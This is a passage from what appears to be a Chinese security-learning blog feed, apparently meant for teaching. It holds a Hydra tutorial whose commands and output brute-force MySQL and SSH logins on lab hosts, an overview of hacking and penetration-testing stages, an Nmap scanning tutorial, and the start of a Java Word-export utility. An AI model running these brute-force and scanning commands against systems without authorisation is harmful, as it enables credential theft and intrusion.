class="line">数据：每台服务器最多4个任务，总共4个任务，15次登录尝试（l:3/p:5）,每个任务约4次尝试</span><br><span class="line">[DATA] attacking mysql://192.168.1.106:3306/</span><br><span class="line">数据：攻击 mysql://192.168.1.106:3306/</span><br><span class="line">[3306][mysql] host: 192.168.1.106   login: root   password: root</span><br><span class="line">1 of 1 target successfully completed, 1 valid password found</span><br><span class="line">1个目标中1个成功完成，找到一个有效密码。</span><br><span class="line">Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-11-26 14:23:56</span><br><span class="line">Hydra 完成于 2022-11-26 14:23:56</span><br></pre></td></tr></table></figure><h3 id="（2）默认端口破解"><a href="#（2）默认端口破解" class="headerlink" title="（2）默认端口破解"></a>（2）默认端口破解</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">如果服务使用的是默认端口，那么指令也可以这样写</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">hydra -L ./login.txt -P ./passwd.txt 目标IP mysql</span></span><br><span class="line">hydra -L ./login.txt -P ./passwd.txt 192.168.1.106 mysql       </span><br><span class="line">Hydra v9.3 (c) 2022 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).</span><br><span class="line"></span><br><span class="line">Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-11-26 14:55:38</span><br><span class="line">[INFO] Reduced number of tasks to 4 (mysql does not like many parallel connections)</span><br><span class="line">[DATA] max 4 tasks per 1 server, overall 4 tasks, 15 login tries (l:3/p:5), ~4 tries per task</span><br><span class="line">[DATA] attacking mysql://192.168.1.106:3306/</span><br><span class="line">[3306][mysql] host: 192.168.1.106   login: root   password: root</span><br><span class="line">1 of 1 target successfully completed, 1 valid password found</span><br><span class="line">Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-11-26 14:55:38</span><br></pre></td></tr></table></figure><h3 id="（3）展示爆破过程"><a href="#（3）展示爆破过程" class="headerlink" title="（3）展示爆破过程"></a>（3）展示爆破过程</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">展示爆破过程，添加指令 -V</span></span><br><span class="line">hydra -L ./login.txt -P ./passwd.txt -V  mysql://192.168.1.106:3306 </span><br><span class="line">Hydra v9.3 (c) 2022 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).</span><br><span class="line"></span><br><span class="line">Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-11-26 15:00:51</span><br><span class="line">[INFO] Reduced number of tasks to 4 (mysql does not like many parallel connections)</span><br><span class="line">[DATA] max 4 tasks per 1 server, overall 4 tasks, 15 login tries (l:3/p:5), ~4 tries per task</span><br><span class="line">[DATA] attacking mysql://192.168.1.106:3306/</span><br><span class="line">[ATTEMPT] target 192.168.1.106 - login &quot;ghost&quot; - pass &quot;123456&quot; - 1 of 15 [child 0] (0/0)</span><br><span class="line">[ATTEMPT] target 192.168.1.106 - login &quot;ghost&quot; - pass &quot;abcdefg&quot; - 2 of 15 [child 1] (0/0)</span><br><span class="line">[ATTEMPT] target 192.168.1.106 - login &quot;ghost&quot; - pass &quot;admin&quot; - 3 of 15 [child 2] (0/0)</span><br><span class="line">[ATTEMPT] target 192.168.1.106 - login &quot;ghost&quot; - pass &quot;root&quot; - 4 of 15 [child 3] (0/0)</span><br><span class="line">[ATTEMPT] target 192.168.1.106 - login &quot;ghost&quot; - pass &quot;987654&quot; - 5 of 15 [child 2] (0/0)</span><br><span class="line">[ATTEMPT] target 192.168.1.106 - login &quot;root&quot; - pass &quot;123456&quot; - 6 of 15 [child 1] (0/0)</span><br><span class="line">[ATTEMPT] target 192.168.1.106 - login &quot;root&quot; - pass &quot;abcdefg&quot; - 7 of 15 [child 0] (0/0)</span><br><span class="line">[ATTEMPT] target 192.168.1.106 - login &quot;root&quot; - pass &quot;admin&quot; - 8 of 15 [child 2] (0/0)</span><br><span class="line">[ATTEMPT] target 192.168.1.106 - login &quot;root&quot; - pass &quot;root&quot; - 9 of 15 [child 3] (0/0)</span><br><span class="line">[ATTEMPT] target 192.168.1.106 - login &quot;root&quot; - pass &quot;987654&quot; - 10 of 15 [child 1] (0/0)</span><br><span class="line">[3306][mysql] host: 192.168.1.106   login: root   password: root</span><br><span class="line">[ATTEMPT] target 192.168.1.106 - login &quot;admin&quot; - pass &quot;123456&quot; - 11 of 15 [child 3] (0/0)</span><br><span class="line">[ATTEMPT] target 192.168.1.106 - login &quot;admin&quot; - pass &quot;abcdefg&quot; - 12 of 15 [child 0] (0/0)</span><br><span class="line">[ATTEMPT] target 192.168.1.106 - login &quot;admin&quot; - pass &quot;admin&quot; - 13 of 15 [child 1] (0/0)</span><br><span class="line">[ATTEMPT] target 192.168.1.106 - login &quot;admin&quot; - pass &quot;root&quot; - 14 of 15 [child 2] (0/0)</span><br><span class="line">[ATTEMPT] target 192.168.1.106 - login &quot;admin&quot; - pass &quot;987654&quot; - 15 of 15 [child 3] (0/0)</span><br><span class="line">1 of 1 target successfully completed, 1 valid password found</span><br><span class="line">Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-11-26 15:00:51</span><br></pre></td></tr></table></figure><h2 id="2-3-ssh-破解"><a href="#2-3-ssh-破解" class="headerlink" title="2.3 ssh 破解"></a>2.3 ssh 破解</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">hydra -L 登录薄 -P 密码薄 -t 线程数 ssh://目标ip</span></span><br><span class="line">hydra -L ./login.txt -P ./passwd.txt -t 4 ssh://192.168.80.129</span><br><span class="line"></span><br><span class="line">Hydra v9.3 (c) 2022 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).</span><br><span class="line"></span><br><span class="line">Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-11-26 16:02:31</span><br><span class="line">[DATA] max 4 tasks per 1 server, overall 4 tasks, 9 login tries (l:3/p:3), ~3 tries per task</span><br><span class="line">[DATA] attacking ssh://192.168.80.129:22/</span><br><span class="line">[22][ssh] host: 192.168.80.129   login: ghost   password: root</span><br><span class="line">[22][ssh] host: 192.168.80.129   login: root   password: root</span><br><span class="line">1 of 1 target successfully completed, 2 valid passwords found</span><br><span class="line">Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-11-26 16:02:50</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网安工具 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网络安全概述</title>
      <link href="/blog/35e10325.html/"/>
      <url>/blog/35e10325.html/</url>
      
        <content type="html"><![CDATA[<h1 id="一：什么是黑客？"><a href="#一：什么是黑客？" class="headerlink" title="一：什么是黑客？"></a>一：什么是黑客？</h1><p>电影：《我是谁：没有绝对安全的系统》</p><p>黑客（hacker）：指的是在信息安全里，能够自由的出入对方系统，擅长IT技术的电脑高手。</p><ul><li><p>黑帽黑客</p></li><li><ul><li>专门研究病毒木马、研究操作系统，寻找漏洞，并且以个人意志为出发点，，攻击网络或者计算机，利用漏洞为自己牟利或者破坏别人的系统、数据等。</li></ul></li><li><p>白帽黑客</p></li><li><ul><li>指那些专门研究或者从事网络计算机技术防御的人，他们通常受雇于各大公司，是维护世界网络、计算机安全的主要力量。很多白帽受雇于公司，对产品进行模拟黑客攻击，以检测产品的可靠性。</li></ul></li><li><p>红客</p></li><li><ul><li>指维护国家利益，不利用网络技术入侵自己国家电脑，而是“维护正义”，为自己国家争光的黑客。</li></ul></li></ul><h1 id="二：法律法规"><a href="#二：法律法规" class="headerlink" title="二：法律法规"></a>二：法律法规</h1><p>中华人民共和国刑法：</p><ul><li>第285条：违反国家规定，侵入国家事务、国防建设、尖端科学技术领域的计算机信息系统的，处三年以下有期徒刑或者拘役。</li><li>第286条：违反国家规定，对计算机信息系统功能进行删除、修改、增加、干扰，造成计算机信息系统不能正常运行，后果严重的，处五年以下有期徒刑或者拘役：后果特别严重的，处五年以上有期徒刑。</li></ul><h1 id="三：渗透测试"><a href="#三：渗透测试" class="headerlink" title="三：渗透测试"></a>三：渗透测试</h1><h2 id="3-1-概念"><a href="#3-1-概念" class="headerlink" title="3.1 概念"></a>3.1 概念</h2><p>通过模拟恶意黑客的攻击方式，同时是在授权情况下对目标系统进行安全性测试和评估的过程。</p><p>重点是测试，是过程，而不是不计后果的攻击或测试防御，它是一套科学流程，不局限于某一工具或者技巧的运用。</p><p>很多白帽子在各大公司从事的工作便是web渗透测试。</p><h2 id="3-2-流程"><a href="#3-2-流程" class="headerlink" title="3.2 流程"></a>3.2 流程</h2><p>确定目标👉信息收集👉漏洞探测👉漏洞利用，获取webshell👉内网渗透👉漏洞验证与修复👉撰写渗透测试报告</p><ul><li>第一步：确定要渗透的目标，也就是选择要测试的目标网站。</li><li>第二步：收集目标网站的相关信息，比如操作系统，数据库，端口服务，所使用的脚本语言，子域名以及CMS系统等等。</li><li>第三步：漏洞探测。利用收集到的信息，寻找目标的脆弱点。</li><li>第四步：漏洞利用，找到对方系统的弱点后，进一步攻克对方系统，拿到目标系统的权限。</li><li>第五步：渗透目标内网的其他主机，把获得的目标机器权限，当作跳板，进一步攻克内网其他主机。</li><li>第六步：验证漏洞与修复漏洞。</li><li>第七步：清除渗透痕迹，撰写测试报告。</li></ul><h1 id="四：网站运行原理"><a href="#四：网站运行原理" class="headerlink" title="四：网站运行原理"></a>四：网站运行原理</h1><h2 id="4-1-网站运行原理"><a href="#4-1-网站运行原理" class="headerlink" title="4.1 网站运行原理"></a>4.1 网站运行原理</h2><p>服务器的操作系统👉中间件👉数据库👉代码👉静态资源</p><ul><li>网站搭建在服务器的操作系统之上，例如windows、linux；</li><li>网站的搭建需要中间件的支撑，例如：tomcat、nginx、apache software foundation；</li><li>网站的搭建需要数据库存放数据，例如：MySQL、SQL Server；</li><li>网站页面是由代码编写的，例如：PHP、JSP、ASP（动态服务器页面）；</li><li>网站页面由部分静态资源组成，例如：html、css、JavaScript；</li></ul><h2 id="4-2-网站运行流程"><a href="#4-2-网站运行流程" class="headerlink" title="4.2 网站运行流程"></a>4.2 网站运行流程</h2><ul><li>第一步：浏览器输入网址，进行网站访问，通过DNS解析域名，找到服务器IP地址</li><li>第二步：发送请求指服务器</li><li>第三步：服务器接收到请求，并响应请求返回给浏览器</li></ul><h1 id="五：环境准备"><a href="#五：环境准备" class="headerlink" title="五：环境准备"></a>五：环境准备</h1><h2 id="5-1-VM-WARE"><a href="#5-1-VM-WARE" class="headerlink" title="5.1 VM WARE"></a>5.1 VM WARE</h2><p>VM WARE 是一款虚拟化软件，利用它，我们能够在自己物理机的 windows 系统上再去安装其他的操作系统；</p><p>官方Windosws版本： </p><p><strong><a href="https://www.vmware.com/go/getworkstation-win">https://www.vmware.com/go/getworkstation-win</a></strong></p><p>使用激活码进行激活服务；</p><h2 id="5-2-kali-linux"><a href="#5-2-kali-linux" class="headerlink" title="5.2 kali linux"></a>5.2 kali linux</h2><p>官方镜像源下载：</p><p><a href="http://old.kali.org/kali-images/kali-2022.3/">http://old.kali.org/kali-images/kali-2022.3/</a></p><p>阿里镜像：</p><p><a href="https://mirrors.aliyun.com/kali-images/kali-2022.3/?spm=a2c6h.25603864.0.0.53e4571cpseXgA">https://mirrors.aliyun.com/kali-images/kali-2022.3/?spm=a2c6h.25603864.0.0.53e4571cpseXgA</a></p><h2 id="5-3-VMware-tools"><a href="#5-3-VMware-tools" class="headerlink" title="5.3 VMware-tools"></a>5.3 VMware-tools</h2><p>方便操作虚拟机，可以实现复制粘贴功能；</p><ol><li>挂载安装包</li><li>复制安装包到tmp目录下方</li><li>进入tmp目录</li><li>解压安装包</li><li>执行安装脚本</li><li>安装完成过后重启kali</li></ol><h2 id="5-4-kali-APT源"><a href="#5-4-kali-APT源" class="headerlink" title="5.4 kali APT源"></a>5.4 kali APT源</h2><p>kail 的 APT 源就相当于一个软件包管理器。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">打开配置文件</span></span><br><span class="line">leafpad /etc/apt/source.list</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">配置阿里源</span></span><br><span class="line">deb http://mirrors.aliyun.com/kali kali-rolling main non-free contrib</span><br><span class="line">deb-src http://mirrors.aliyun.com/kali kali-rolling main non-free contrib</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">更新源</span></span><br><span class="line">apt-get update</span><br></pre></td></tr></table></figure><ol><li>通过 leafpad 打开源的配置文件 sources.list</li><li>复制粘贴中科大源进去</li><li>ctrl + s 保存并退出</li><li>输入命令 apt-get update</li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">　kali 写入时出现 E121：无法打开并写入文件</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">　解决方案</span></span><br><span class="line">1.保存的时候使用：ｗ !sudo tee %</span><br><span class="line">2.输入密码即可 </span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网安入门 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Nmap 使用教程</title>
      <link href="/blog/cf508180.html/"/>
      <url>/blog/cf508180.html/</url>
      
        <content type="html"><![CDATA[<h2 id="一：Nmap-Commands（诸神之眼）"><a href="#一：Nmap-Commands（诸神之眼）" class="headerlink" title="一：Nmap Commands（诸神之眼）"></a>一：Nmap Commands（诸神之眼）</h2><ul><li>扫描对方网站端口</li><li>扫描对方网站服务</li><li>操作系统、版本相关信息</li><li>配合脚本去扫描对方存在的漏洞</li></ul><h2 id="二：常用扫描命令"><a href="#二：常用扫描命令" class="headerlink" title="二：常用扫描命令"></a>二：常用扫描命令</h2><h3 id="2-1-简单扫描目标"><a href="#2-1-简单扫描目标" class="headerlink" title="2.1 简单扫描目标"></a>2.1 简单扫描目标</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">namp + 目标ip/域名（简单扫描目标）</span></span><br><span class="line">nmap 192.168.1.106</span><br><span class="line"></span><br><span class="line">Starting Nmap 7.92 ( https://nmap.org ) at 2022-11-26 04:17 CST</span><br><span class="line">Nmap scan report for localhost (192.168.1.106)</span><br><span class="line">Host is up (0.00076s latency).</span><br><span class="line">Not shown: 992 filtered tcp ports (no-response)</span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line">135/tcp  open  msrpc</span><br><span class="line">139/tcp  open  netbios-ssn</span><br><span class="line">443/tcp  open  https</span><br><span class="line">445/tcp  open  microsoft-ds</span><br><span class="line">902/tcp  open  iss-realsecure</span><br><span class="line">912/tcp  open  apex-mesh</span><br><span class="line">1433/tcp open  ms-sql-s</span><br><span class="line">3306/tcp open  mysql</span><br></pre></td></tr></table></figure><ul><li>port：端口</li><li>state：端口状态</li><li>service：端口服务</li><li>open：端口是开放的</li><li>closed：端口是关闭的</li><li>filtered：端口被防火墙IDS&#x2F;IPS屏蔽，无法确定状态</li><li>unfiletered：端口未被屏蔽，但是否开发需要进一步确定</li><li>open | filtered：端口开放的或者被过滤</li><li>closed | filteres：端口关闭或者被过滤</li></ul><h3 id="2-2-扫描目标网段及其它主机"><a href="#2-2-扫描目标网段及其它主机" class="headerlink" title="2.2 扫描目标网段及其它主机"></a>2.2 扫描目标网段及其它主机</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">nmap + 目标ip网段（扫描目标网段及其他主机）</span></span><br><span class="line">nmap 192.168.1.0/24</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="2-3-对目标全面扫描"><a href="#2-3-对目标全面扫描" class="headerlink" title="2.3 对目标全面扫描"></a>2.3 对目标全面扫描</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">nmap -A -T4 + 目标ip（对目标全面扫描）</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">-A: 采用全面扫描的方式</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">-T4: 采用的是T4级别进行扫描（T5最高级别，速度最快）</span></span><br><span class="line">nmap -A -T4 192.168.1.106</span><br></pre></td></tr></table></figure><h3 id="2-4-扫描目标常见的100端口"><a href="#2-4-扫描目标常见的100端口" class="headerlink" title="2.4 扫描目标常见的100端口"></a>2.4 扫描目标常见的100端口</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">nmap --top-ports 100 + 目标ip（扫描目标最常见的100端口）</span></span><br><span class="line">nmap --top-ports 100 192.168.1.106</span><br></pre></td></tr></table></figure><h3 id="2-5-采用sS模式、T4级别扫描目标的端口、服务、操作系统版本"><a href="#2-5-采用sS模式、T4级别扫描目标的端口、服务、操作系统版本" class="headerlink" title="2.5 采用sS模式、T4级别扫描目标的端口、服务、操作系统版本"></a>2.5 采用sS模式、T4级别扫描目标的端口、服务、操作系统版本</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">nmap -sS -sV -T4 + 目标ip（采用sS模式、T4级别扫描目标的端口、服务、操作系统的版本）</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">-sS: 使用 TCP SYN 扫描</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">-sV: 进行版本探测</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">-T4: 使用一种快速扫描的方式，扫描速度的级别范围在（T0-T5）之间，级别越高，扫描速度越快。</span></span><br><span class="line">nmap -sS -sV -T4 192.168.1.106</span><br></pre></td></tr></table></figure><h3 id="2-6-采用vuln脚本扫描目标"><a href="#2-6-采用vuln脚本扫描目标" class="headerlink" title="2.6 采用vuln脚本扫描目标"></a>2.6 采用vuln脚本扫描目标</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">nmap --script=vuln + 目标ip</span></span><br><span class="line">nmap --script=vuln 192.168.1.106</span><br></pre></td></tr></table></figure><h2 id="三：图形-zenmap-使用"><a href="#三：图形-zenmap-使用" class="headerlink" title="三：图形 zenmap 使用"></a>三：图形 zenmap 使用</h2><p>nmap的图形化工具，具体使用步骤如下：</p><ol><li>输入ip或者域名</li><li>选择扫描方式</li><li>执行扫描</li></ol>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网安工具 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Word模板导出功能实现</title>
      <link href="/blog/bd69f69c.html/"/>
      <url>/blog/bd69f69c.html/</url>
      
        <content type="html"><![CDATA[<h1 id="Wrod-模板导出功能实现"><a href="#Wrod-模板导出功能实现" class="headerlink" title="Wrod 模板导出功能实现"></a>Wrod 模板导出功能实现</h1><h2 id="一：准备Word模板"><a href="#一：准备Word模板" class="headerlink" title="一：准备Word模板"></a>一：准备Word模板</h2><p>根据自身需求，准备响应的模板，并提取模板文件；</p><h2 id="二：核心类"><a href="#二：核心类" class="headerlink" title="二：核心类"></a>二：核心类</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Author: Rupert Tears</span></span><br><span class="line"><span class="comment"> * Date: Created in 19:01 2022/11/20</span></span><br><span class="line"><span class="comment"> * Description: Thought is already is late, exactly is the earliest time.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">GenerateDocxUtil</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">Logger</span> <span class="variable">logger</span> <span class="operator">=</span> LoggerFactory.getLogger(GenerateDocxUtil.class);</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">freemarkerDocxTest</span><span class="params">(String rootPath, Map&lt;String,Object&gt; dataMap, String docxPath)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="comment">//配置freemarker模板</span></span><br><span class="line">        <span class="type">Configuration</span> <span class="variable">configuration</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Configuration</span>();</span><br><span class="line">        <span class="type">String</span> <span class="variable">fileDirectory</span> <span class="operator">=</span> rootPath;</span><br><span class="line">        configuration.setDirectoryForTemplateLoading(<span class="keyword">new</span> <span class="title class_">File</span>(fileDirectory));</span><br><span class="line">        <span class="type">String</span> <span class="variable">temName</span> <span class="operator">=</span>  <span class="string">&quot;tem1.xml&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">docxZipPath</span> <span class="operator">=</span> rootPath + <span class="string">&quot;tem1.zip&quot;</span>;</span><br><span class="line">        <span class="type">Template</span> <span class="variable">template</span> <span class="operator">=</span> configuration.getTemplate(temName);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//通过模板生成的xml临时文件 方法结束后删除该临时文件</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">outFilePath</span> <span class="operator">=</span> rootPath + UUID.randomUUID().toString().replace(<span class="string">&quot;-&quot;</span>,<span class="string">&quot;&quot;</span>) + <span class="string">&quot;.xml&quot;</span>;</span><br><span class="line">        <span class="comment">//指定输出word xml文件的路径</span></span><br><span class="line">        <span class="type">File</span> <span class="variable">docXmlFile</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(outFilePath);</span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(docXmlFile);</span><br><span class="line">        <span class="type">Writer</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedWriter</span>(<span class="keyword">new</span> <span class="title class_">OutputStreamWriter</span>(fos),<span class="number">10240</span>);</span><br><span class="line">        template.process(dataMap,out);</span><br><span class="line">        <span class="keyword">if</span>(out != <span class="literal">null</span>)&#123;</span><br><span class="line">            out.close();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//以下代码 主要用来加密已经生成的xml文件，把xml文件正式转换成加密的word文档</span></span><br><span class="line">        <span class="comment">//包装输入流</span></span><br><span class="line">        <span class="type">ZipInputStream</span> <span class="variable">zipInputStream</span> <span class="operator">=</span>  wrapZipInputStream(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="keyword">new</span> <span class="title class_">File</span>(docxZipPath)));</span><br><span class="line">        <span class="comment">//包装输出流</span></span><br><span class="line">        <span class="type">ZipOutputStream</span> <span class="variable">zipOutputStream</span> <span class="operator">=</span>  wrapZipOutputStream(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="keyword">new</span> <span class="title class_">File</span>(docxPath)));</span><br><span class="line">        <span class="comment">//正式加密替换成docx格式文档</span></span><br><span class="line">        List&lt;String&gt; itemNameList = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">        itemNameList.add(<span class="string">&quot;word/document.xml&quot;</span>);</span><br><span class="line">        <span class="comment">//如果需要替换图片添加此行代码，&quot;word/media/image1.png&quot;为解压出来docx模板后，模板中对应图片的完整路径及名称，如果你添加的图片为jpg格式，那么图片名称会是&quot;image1.jpg&quot;或&quot;image1.jpeg&quot;，各位自己视情况修改，如需替换多张图片就举一反三，往list插入多个元素，我相信你们可以理解的</span></span><br><span class="line"><span class="comment">//        itemNameList.add(&quot;word/media/image1.png&quot;);</span></span><br><span class="line"></span><br><span class="line">        List&lt;InputStream&gt; itemInputStreamList = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">        itemInputStreamList.add(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="keyword">new</span> <span class="title class_">File</span>(outFilePath)));</span><br><span class="line">        <span class="comment">//这里添加你想替换的图片</span></span><br><span class="line"><span class="comment">//        itemInputStreamList.add(new FileInputStream(new File($&#123;图片路径&#125;)));</span></span><br><span class="line"></span><br><span class="line">        replaceItemList(zipInputStream, zipOutputStream, itemNameList, itemInputStreamList);</span><br><span class="line">        <span class="keyword">new</span> <span class="title 